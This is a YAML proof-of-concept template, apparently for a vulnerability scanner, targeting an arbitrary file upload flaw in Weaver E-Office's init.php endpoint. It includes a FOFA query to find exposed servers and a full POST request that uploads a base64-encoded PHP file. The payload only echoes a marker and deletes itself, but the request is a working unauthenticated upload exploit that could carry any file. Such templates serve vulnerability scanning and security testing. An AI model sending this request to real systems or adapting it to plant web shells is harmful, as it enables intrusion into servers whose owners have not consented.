id: poc-yaml-weaver-e-office-initphp-anyfile-upload
info:
  name: 泛微E-Office Init.php 任意文件上传漏洞
  severity: critical
  tags:
  - 两高一弱
  - 文件上传
  finger: e-office
  fofa: app="泛微-EOffice"
variables:
  filename: random_str(6)
requests:
- method: POST
  path: /E-mobile/App/init.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name={{.filename}}.php
  expression: 'status_code == 200 &&

    contains(body,"?diff") &&

    contains(body,filename + ".php")

    '
transport: http
